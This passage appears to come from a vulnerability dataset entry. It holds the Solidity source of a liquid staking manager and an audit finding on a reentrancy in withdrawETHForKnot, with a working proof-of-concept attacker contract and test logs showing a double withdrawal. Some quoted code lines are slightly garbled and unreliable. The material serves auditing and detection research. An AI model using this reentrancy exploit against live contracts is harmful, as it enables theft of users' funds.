IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n\n    /// @notice In the event the node runner coordinates with the DAO to sell their wallet, allow rotation\n    /// @dev EOA representative rotation done outside this method because there may be knots currently staked etc.\n    /// @param _current address of the present node runner of the smart wallet\n    /// @param _new address of the new node runner of the smart wallet\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        require(_new != address(0) && _current != _new, \"New is zero or current\");\n\n        address wallet = smartWalletOfNodeRunner[_current];\n        require(wallet != address(0), \"Wallet does not exist\");\n        require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");\n\n        address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];\n        require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");\n\n        smartWalletOfNodeRunner[_new] = wallet;\n        nodeRunnerOfSmartWallet[wallet] = _new;\n\n        delete smartWalletOfNodeRunner[_current];\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new);\n    }\n\n    /// @notice function to allow a node runner to claim ETH from the syndicate from their smart wallet\n    /// @param _recipient End recipient of ETH from syndicate rewards\n    /// @param _blsPubKeys list of BLS public keys to claim reward for\n    function claimRewardsAsNodeRunner(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        require(_blsPubKeys.length > 0, \"No BLS keys specified\");\n        require(_recipient != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"Unknown node runner\");\n\n        for(uint256 i; i < _blsPubKeys.length; ++i) {\n            require(isBLSPublicKeyBanned(_blsPubKeys[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the node runner doesn't claim rewards for KNOTs from other smart wallets\n            require(smartWalletOfKnot[_blsPubKeys[i]] == smartWallet, \"BLS public key doesn't belong to the node runner\");\n        }\n\n        // Fetch ETH accrued\n        uint256 balBefore = address(this).balance;\n        IOwnableSmartWallet(smartWallet).execute(\n            syndicate,\n            abi.encodeWithSelector(\n                Syndicate.claimAsCollateralizedSLOTOwner.selector,\n                address(this),\n                _blsPubKeys\n            )\n        );\n\n        (uint256 nodeRunnerAmount, uint256 daoAmount) = _calculateCommission(address(this).balance - balBefore);\n        (bool transferResult, ) = _recipient.call{value: nodeRunnerAmount}(\"\");\n        require(transferResult, \"Failed to transfer\");\n\n        if (daoAmount > 0) {\n            (transferResult, ) = dao.call{value: daoAmount}(\"\");\n            require(transferResult, \"Failed to transfer\");\n        }\n\n        emit NodeRunnerRewardsClaimed(msg.sender, _recipient);\n    }\n\n    /// @notice register a node runner to LSD by creating a new smart wallet\n    /// @param _blsPublicKeys list of BLS public keys\n    /// @param _blsSignatures list of BLS signatures\n    /// @param _eoaRepresentative EOA representative of wallet\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        uint256 len = _blsPublicKeys.length;\n        require(len >= 1, \"No value provided\");\n        require(len == _blsSignatures.length, \"Unequal number of array values\");\n        require(msg.value == len * 4 ether, \"Insufficient ether provided\");\n        require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\");\n        require(_isNodeRunnerValid(msg.sender) == true, \"Unrecognised node runner\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n\n        if(smartWallet == address(0)) {\n            // create new wallet owned by liquid staking manager\n            smartWallet = smartWalletFactory.createWallet(address(this));\n            emit SmartWalletCreated(smartWallet, msg.sender);\n\n            // associate node runner with the newly created wallet\n            smartWalletOfNodeRunner[msg.sender] = smartWallet;\n            nodeRunnerOfSmartWallet[smartWallet] = msg.sender;\n\n            _authorizeRepresentative(smartWallet, _eoaRepresentative, true);\n        }\n\n        // Ensure that the node runner does not whitelist multiple EOA representatives - they can only have 1 active at a time\n        if(smartWalletRepresentative[smartWallet] != address(0)) {\n            require(smartWalletRepresentative[smartWallet] == _eoaRepresentative, \"Different EOA specified - rotate outside\");\n        }\n\n        {\n            // transfer ETH to smart wallet\n            (bool result,) = smartWallet.call{value: msg.value}(\"\");\n            require(result, \"Transfer failed\");\n            emit WalletCredited(smartWallet, msg.value);\n        }\n\n        for(uint256 i; i < len; ++i) {\n            bytes calldata _blsPublicKey = _blsPublicKeys[i];\n\n            // check if the BLS public key is part of LSD network and is not banned\n            require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKey) == IDataStructures.LifecycleStatus.UNBEGUN,\n                \"Lifecycle status must be zero\"\n            );\n\n            // register validtor initals for each of the KNOTs\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidatorInitials.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _blsSignatures[i]\n                )\n            );\n\n            // register the smart wallet with the BLS public key\n            smartWalletOfKnot[_blsPublicKey] = smartWallet;\n\n            emit NewLSDValidatorRegistered(msg.sender, _blsPublicKey);\n        }\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @notice function to check if a node runner address is banned\n    /// @param _nodeRunner address of the node runner\n    /// @return true if the node runner is banned, false otherwise\n    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {\n        return bannedNodeRunners[_nodeRunner];\n    }\n\n    /// @notice function to check if a KNOT is deregistered\n    /// @param _blsPublicKey BLS public key of the KNOT\n    /// @return true if the KNOT is deregistered, false otherwise\n    function isKnotDeregistered(bytes calldata _blsPublicKey) public view returns (bool) {\n        return Syndicate(payable(syndicate)).isNoLongerPartOfSyndicate(_blsPublicKey);\n    }\n\n    /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication\n    /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)\n    /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain\n    /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup\n    /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature\n    /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract\n    function stake(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        bytes[] calldata _ciphertexts,\n        bytes[] calldata _aesEncryptorKeys,\n        IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n        bytes32[] calldata _dataRoots\n    ) external {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"No data\");\n        require(numOfValidators == _ciphertexts.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _aesEncryptorKeys.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _encryptionSignatures.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _dataRoots.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfValidators; ++i) {\n            bytes calldata blsPubKey = _blsPublicKeyOfKnots[i];\n            // check if BLS public key is registered with liquid staking derivative network and not banned\n            require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet != address(0), \"Unknown BLS public key\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Initials not registered\"\n            );\n\n            // check minimum balance of smart wallet, dao staking fund vault and savETH vault\n            _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n            _stake(\n                _blsPublicKeyOfKnots[i],\n                _ciphertexts[i],\n                _aesEncryptorKeys[i],\n                _encryptionSignatures[i],\n                _dataRoots[i]\n            );\n\n            address representative = smartWalletRepresentative[associatedSmartWallet];\n\n            if(representative != address(0)) {\n                // unauthorize the EOA representative on the Stakehouse\n                _authorizeRepresentative(associatedSmartWallet, representative, false);\n                // make the representative dormant before unauthorizing it\n                smartWalletDormantRepresentative[associatedSmartWallet] = representative;\n                emit DormantRepresentative(associatedSmartWallet, representative);\n            }\n        }\n    }\n\n    /// @notice Anyone can call this to trigger creating a knot which will mint derivatives once the balance has been reported\n    /// @param _blsPublicKeyOfKnots List of BLS public keys registered with the network becoming knots and minting derivatives\n    /// @param _beaconChainBalanceReports List of beacon chain balance reports\n    /// @param _reportSignatures List of attestations for the beacon chain balance reports\n    function mintDerivatives(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n        IDataStructures.EIP712Signature[] calldata _reportSignatures\n    ) external {\n        uint256 numOfKnotsToProcess = _blsPublicKeyOfKnots.length;\n        require(numOfKnotsToProcess > 0, \"Empty array\");\n        require(numOfKnotsToProcess == _beaconChainBalanceReports.length, \"Inconsistent array lengths\");\n        require(numOfKnotsToProcess == _reportSignatures.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfKnotsToProcess; ++i) {\n            // check if BLS public key is registered and not banned\n            require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the BLS pub key has deposited lifecycle\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.DEPOSIT_COMPLETED,\n                \"Lifecycle status must be two\"\n            );\n\n            // The first knot will create the Stakehouse\n            if(numberOfKnots == 0) {\n                _createLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n            else {\n                // join stakehouse\n                _joinLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n\n            address smartWallet = smartWalletOfKnot[_blsPublicKeyOfKnots[i]];\n            stakedKnotsOfSmartWallet[smartWallet] -= 1;\n\n            if(stakedKnotsOfSmartWallet[smartWallet] == 0) {\n                _authorizeRepresentative(smartWallet, smartWalletDormantRepresentative[smartWallet], true);\n\n                // delete the dormant representative as it is set active\n                delete smartWalletDormantRepresentative[smartWallet];\n            }\n\n            // Expand the staking funds vault shares that can claim rewards\n            stakingFundsVault.updateDerivativesMinted();\n        }\n    }\n\n    receive() external payable {}\n\n    /// @notice Every liquid staking derivative network has a single fee recipient determined by its syndicate contract\n    /// @dev The syndicate contract is only deployed after the first KNOT to mint derivatives creates the network Stakehouse\n    /// @dev Because the syndicate contract for the LSDN is deployed with CREATE2, we can predict the fee recipient ahead of time\n    /// @dev This is important because node runners need to configure their nodes before or immediately after staking\n    function getNetworkFeeRecipient() external view returns (address) {\n        // Always 1 knot initially registered to the syndicate because we expand it one by one\n        return syndicateFactory.calculateSyndicateDeploymentAddress(\n            address(this),\n            address(this),\n            1\n        );\n    }\n\n    /// @dev Internal method for managing the initialization of the staking manager contract\n    function _init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) internal {\n        require(_dao != address(0), \"Zero address\");\n        require(_syndicateFactory != address(0), \"Zero address\");\n        require(_smartWalletFactory != address(0), \"Zero address\");\n        require(_brand != address(0), \"Zero address\");\n        require(bytes(_stakehouseTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_stakehouseTicker).length <= 5, \"String must be 3-5 characters long\");\n\n        brand = _brand;\n        dao = _dao;\n        syndicateFactory = ISyndicateFactory(_syndicateFactory);\n        smartWalletFactory = IOwnableSmartWalletFactory(_smartWalletFactory);\n        stakehouseTicker = _stakehouseTicker;\n\n        _updateDAORevenueCommission(_optionalCommission);\n\n        _initStakingFundsVault(_stakingFundsVaultDeployer, _lpTokenFactory);\n        _initSavETHVault(_savETHVaultDeployer, _lpTokenFactory);\n\n        if (_deployOptionalGatekeeper) {\n            gatekeeper = OptionalGatekeeperFactory(_optionalGatekeeperDeployer).deploy(address(this));\n        }\n    }\n\n    /// @dev function checks if a node runner is valid depending upon whitelisting status\n    /// @param _nodeRunner address of the user requesting to become node runner\n    /// @return true if eligible. reverts with message if not eligible\n    function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {\n        require(_nodeRunner != address(0), \"Zero address\");\n\n        if(enableWhitelisting) {\n            require(isNodeRunnerWhitelisted[_nodeRunner] == true, \"Invalid node runner\");\n        }\n\n        return true;\n    }\n\n    /// @dev Manage the removal and appointing of smart wallet representatives including managing state\n    function _authorizeRepresentative(\n        address _smartWallet, \n        address _eoaRepresentative, \n        bool _isEnabled\n    ) internal {\n        if(!_isEnabled && smartWalletRepresentative[_smartWallet] != address(0)) {\n\n            // authorize the EOA representative on the Stakehouse\n            IOwnableSmartWallet(_smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.authorizeRepresentative.selector,\n                    _eoaRepresentative,\n                    _isEnabled\n                )\n            );\n\n            // delete the mapping\n            delete smartWalletRepresentative[_smartWallet];\n\n            emit RepresentativeRemoved(_smartWallet, _eoaRepresentative);\n        }\n        else if(_isEnabled && smartWalletRepresentative[_smartWallet] == address(0)) {\n\n            // authorize the EOA representative on the Stakehouse\n            IOwnableSmartWallet(_smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.authorizeRepresentative.selector,\n                    _eoaRepresentative,\n                    _isEnabled\n                )\n            );\n\n            // store EOA to the wallet mapping\n            smartWalletRepresentative[_smartWallet] = _eoaRepresentative;\n\n            emit RepresentativeAppointed(_smartWallet, _eoaRepresentative);\n        } else {\n            revert(\"Unexpected state\");\n        }\n    }\n\n    /// @dev Internal method for doing just staking - pre-checks done outside this method to avoid stack too deep\n    function _stake(\n        bytes calldata _blsPublicKey,\n        bytes calldata _cipherText,\n        bytes calldata _aesEncryptorKey,\n        IDataStructures.EIP712Signature calldata _encryptionSignature,\n        bytes32 dataRoot\n    ) internal {\n        address smartWallet = smartWalletOfKnot[_blsPublicKey];\n\n        // send 24 ether from savETH vault to smart wallet\n        savETHVault.withdrawETHForStaking(smartWallet, 24 ether);\n\n        // send 4 ether from DAO staking funds vault\n        stakingFundsVault.withdrawETH(smartWallet, 4 ether);\n\n        // interact with transaction router using smart wallet to deposit 32 ETH\n        IOwnableSmartWallet(smartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.registerValidator.selector,\n                smartWallet,\n                _blsPublicKey,\n                _cipherText,\n                _aesEncryptorKey,\n                _encryptionSignature,\n                dataRoot\n            ),\n            32 ether\n        );\n\n        // increment number of staked KNOTs in the wallet\n        stakedKnotsOfSmartWallet[smartWallet] += 1;\n\n        emit KnotStaked(_blsPublicKey, msg.sender);\n    }\n\n    /// @dev The second knot onwards will join the LSDN stakehouse and expand the registered syndicate knots\n    function _joinLSDNStakehouse(\n        bytes calldata _blsPubKey,\n        IDataStructures.ETH2DataReport calldata _beaconChainBalanceReport,\n        IDataStructures.EIP712Signature calldata _reportSignature\n    ) internal {\n        // total number of knots created with the syndicate increases\n        numberOfKnots += 1;\n\n        // The savETH will go to the savETH vault, the collateralized SLOT for syndication owned by the smart wallet\n        // sETH will also be minted in the smart wallet but will be moved out and distributed to the syndicate for claiming by the DAO\n        address associatedSmartWallet = smartWalletOfKnot[_blsPubKey];\n\n        // Join the LSDN stakehouse\n        string memory lowerTicker = IBrandNFT(brand).toLowerCase(stakehouseTicker);\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.joinStakehouse.selector,\n                associatedSmartWallet,\n                _blsPubKey,\n                stakehouse,\n                IBrandNFT(brand).lowercaseBrandTickerToTokenId(lowerTicker),\n                savETHVault.indexOwnedByTheVault(),\n                _beaconChainBalanceReport,\n                _reportSignature\n            )\n        );\n\n        // Register the knot to the syndicate\n        bytes[] memory _blsPublicKeyOfKnots = new bytes[](1);\n        _blsPublicKeyOfKnots[0] = _blsPubKey;\n        Syndicate(payable(syndicate)).registerKnotsToSyndicate(_blsPublicKeyOfKnots);\n\n        // Autostake DAO sETH with the syndicate\n        _autoStakeWithSyndicate(associatedSmartWallet, _blsPubKey);\n\n        emit StakehouseJoined(_blsPubKey);\n    }\n\n    /// @dev Perform all the steps required to create the LSDN stakehouse that other knots will join\n    function _createLSDNStakehouse(\n        bytes calldata _blsPublicKeyOfKnot,\n        IDataStructures.ETH2DataReport calldata _beaconChainBalanceReport,\n        IDataStructures.EIP712Signature calldata _reportSignature\n    ) internal {\n        // create stakehouse and mint derivative for first bls key - the others are just used to create the syndicate\n        // The savETH will go to the savETH vault, the collateralized SLOT for syndication owned by the smart wallet\n        // sETH will also be minted in the smart wallet but will be moved out and distributed to the syndicate for claiming by the DAO\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.createStakehouse.selector,\n                associatedSmartWallet,\n                _blsPublicKeyOfKnot,\n                stakehouseTicker,\n                savETHVault.indexOwnedByTheVault(),\n                _beaconChainBalanceReport,\n                _reportSignature\n            )\n        );\n\n        // Number of knots has increased\n        numberOfKnots += 1;\n\n        // Capture the address of the Stakehouse for future knots to join\n        stakehouse = getStakeHouseUniverse().memberKnotToStakeHouse(_blsPublicKeyOfKnot);\n        IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakehouse));\n\n        // Give liquid staking manager ability to manage keepers and set a house keeper if decided by the network\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            stakehouse,\n            abi.encodeWithSelector(\n                Ownable.transferOwnership.selector,\n                address(this)\n            )\n        );\n\n        if (address(gatekeeper) != address(0)) {\n            IStakeHouseRegistry(stakehouse).setGateKeeper(address(gatekeeper));\n        }\n\n        // Deploy the EIP1559 transaction reward sharing contract but no priority required because sETH will be auto staked\n        address[] memory priorityStakers = new address[](0);\n        bytes[] memory initialKnots = new bytes[](1);\n        initialKnots[0] = _blsPublicKeyOfKnot;\n        syndicate = syndicateFactory.deploySyndicate(\n            address(this),\n            0,\n            priorityStakers,\n            initialKnots\n        );\n\n        // Contract approves syndicate to take sETH on behalf of the DAO\n        sETH.approve(syndicate, (2 ** 256) - 1);\n\n        // Auto-stake sETH by pulling sETH out the smart wallet and staking in the syndicate\n        _autoStakeWithSyndicate(associatedSmartWallet, _blsPublicKeyOfKnot);\n\n        emit StakehouseCreated(stakehouseTicker, stakehouse);\n    }\n\n    /// @dev Remove the sETH from the node runner smart wallet in order to auto-stake the sETH in the syndicate\n    function _autoStakeWithSyndicate(address _associatedSmartWallet, bytes memory _blsPubKey) internal {\n        IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakehouse));\n\n        uint256 stakeAmount = 12 ether;\n        IOwnableSmartWallet(_associatedSmartWallet).execute(\n            address(sETH),\n            abi.encodeWithSelector(\n                IERC20.transfer.selector,\n                address(this),\n                stakeAmount\n            )\n        );\n\n        // Create the payload for staking\n        bytes[] memory stakingKeys = new bytes[](1);\n        stakingKeys[0] = _blsPubKey;\n\n        uint256[] memory stakeAmounts = new uint256[](1);\n        stakeAmounts[0] = stakeAmount;\n\n        // Stake the sETH to be received by the LPs of the Staking Funds Vault (fees and mev)\n        Syndicate(payable(syndicate)).stake(stakingKeys, stakeAmounts, address(stakingFundsVault));\n    }\n\n    /// @dev Something that can be overriden during testing\n    function _initSavETHVault(address _savETHVaultDeployer, address _lpTokenFactory) internal virtual {\n        // Use an external deployer to reduce the size of the liquid staking manager\n        savETHVault = SavETHVault(\n            SavETHVaultDeployer(_savETHVaultDeployer).deploySavETHVault(address(this), _lpTokenFactory)\n        );\n    }\n\n    function _initStakingFundsVault(address _stakingFundsVaultDeployer, address _tokenFactory) internal virtual {\n        stakingFundsVault = StakingFundsVault(\n            payable(StakingFundsVaultDeployer(_stakingFundsVaultDeployer).deployStakingFundsVault(\n                address(this),\n                _tokenFactory\n            ))\n        );\n    }\n\n    /// @dev This can be overriden to customise fee percentages\n    function _calculateCommission(uint256 _received) internal virtual view returns (uint256 _nodeRunner, uint256 _dao) {\n        require(_received > 0, \"Nothing received\");\n\n        if (daoCommissionPercentage > 0) {\n            uint256 daoAmount = (_received * daoCommissionPercentage) / MODULO;\n            uint256 rest = _received - daoAmount;\n            return (rest, daoAmount);\n        }\n\n        return (_received, 0);\n    }\n\n    /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved\n    function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n        address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n        require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n        LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n        require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n        require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n        LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n        require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n        require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n    }\n\n    /// @dev Internal method for dao to trigger updating commission it takes of node runner revenue\n    function _updateDAORevenueCommission(uint256 _commissionPercentage) internal {\n        require(_commissionPercentage <= MODULO, \"Invalid commission\");\n\n        emit DAOCommissionUpdated(daoCommissionPercentage, _commissionPercentage);\n\n        daoCommissionPercentage = _commissionPercentage;\n    }\n}\n\n\n",
        "CodeNames": [
            "LiquidStakingManager.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "//solidity\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance = 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n",
                    "//solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n",
                    "//solidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n",
                    "//solidity\ninterface IManager {\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable;\n    function withdrawETHForKnot(\n        address _recipient, \n        bytes calldata _blsPublicKeyOfKnot\n    ) external;\n}\n\ncontract NonEOARepresentative {\n\n    address manager;\n    bool state;\n\n    constructor(address _manager) payable {\n\n        bytes[] memory publicKeys = new bytes[(2);\n        publicKeys[0] = \"publicKeys1\";\n        publicKeys[1] = \"publicKeys2\";\n\n        bytes[] memory signature = new bytes[(2);\n        signature[0] = \"signature1\";\n        signature[1] = \"signature2\";\n\n        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(\n            publicKeys,\n            signature,\n            address(this)\n        );\n\n        manager = _manager;\n\n    }\n\n    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n    }\n\n    receive() external payable {\n        if(!state) {\n            state = true;\n            this.withdraw(\"publicKeys1\");\n        }\n    }\n\n}\n",
                    "//solidity\nfunction testBypassIsContractCheck_POC() public {\n\n\tNonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));\n\taddress wallet = manager.smartWalletOfNodeRunner(address(pass));\n\taddress reprenstative = manager.smartWalletRepresentative(wallet);\n\tconsole.log(\"smart contract registered as a EOA representative\");\n\tconsole.log(address(reprenstative) == address(pass));\n\n\t// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);\n\n\t// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER\n\tpass.withdraw(\"publicKeys1\");\n\tconsole.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");\n\tconsole.log(address(pass).balance);\n\n}\n",
                    "//solidity\nforge test -vv --match testWithdraw_Reentrancy_POC\n",
                    "//solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)\nLogs:\n  smart contract registered as a EOA representative\n  true\n  balance after the withdraw, expected 4 ETH, but has 8 ETH\n  8000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 14.85ms\n",
                    "//solidity\nfunction withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n\tIManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n}\n",
                    "//solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n",
                    "//solidity\nreceive() external payable {\n\tif(!state) {\n\t\tstate = true;\n\t\tthis.withdraw(\"publicKeys1\");\n\t}\n}\n"
                ],
                "Type": " Reentrancy in  LiquidStakingManager.sol#withdrawETHForKnow  leads to loss of fund from smart wallet",
                "Description": "*Submitted by ladboy233(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110), also found by Trust(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/402), btk(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/330), 0xbepresent(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/288), bitbopper(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/222), and yixxas(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/181)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347<br\n\nThe code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.\n\nsolidity\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external 